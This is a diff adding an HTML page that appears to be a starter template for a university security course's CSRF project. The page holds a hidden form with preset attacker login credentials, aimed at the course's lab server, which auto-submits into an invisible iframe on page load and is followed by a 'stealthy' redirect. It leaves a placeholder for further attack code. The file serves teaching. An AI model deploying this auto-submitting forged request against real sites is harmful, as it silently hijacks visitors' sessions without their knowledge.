@@ -1,0 +1,31 @@
+<html>
+    <body>
+        <!-- Stealthy IFrame (leave here) -->
+        <iframe name="BlankPage" style="visibility:hidden;"></iframe>
+
+        <!-- Update any "..." fields accordingly! -->
+        <form action="http://cs4440.eng.utah.edu/project3/login?csrfdefense=0&xssdefense=4/"
+              target="BlankPage"
+              name="EvilPayload"
+              method="POST">
+
+            <input name="csrfdefense" value="0"type="hidden">
+            <input name="xssdefense" value="4" type="hidden">
+            <input name="username" value="attacker" type="hidden"/>
+            <input name="password" value="l33th4x" type="hidden"/>
+
+            <!----------------------------
+            | Your attack code goes here! 
+            ----------------------------->
+            
+        </form>
+
+        <!-- Launch the attack! -->
+        <script>
+            document.EvilPayload.submit();
+        </script>
+
+        <!-- Stealty redirect (leave here) -->
+        <meta http-equiv="refresh" content="1; URL=http://cs4440.eng.utah.edu/project3" />
+    </body>
+</html>
